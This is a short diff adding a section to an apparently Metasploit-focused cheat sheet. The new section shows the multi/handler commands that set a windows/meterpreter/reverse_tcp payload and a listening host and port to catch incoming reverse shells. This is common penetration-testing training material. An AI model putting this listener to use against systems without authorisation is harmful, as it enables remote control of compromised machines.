@@ -65,3 +65,24 @@ workspace <workspace_name>
 workspace -d <workspace_name>
 ```
 
+## Setting a handler
+1. **Use the `multi/handler` Module**
+This module is used to handle incoming connections from reverse payloads.
+
+```bash
+use multi/handler
+```
+
+2. **Set the Payload**
+
+```bash
+set PAYLOAD windows/meterpreter/reverse_tcp
+```
+
+3. **Configure and run**
+
+```bash
+set LHOST <your_IP>
+set LPORT <your_port>
+run
+```
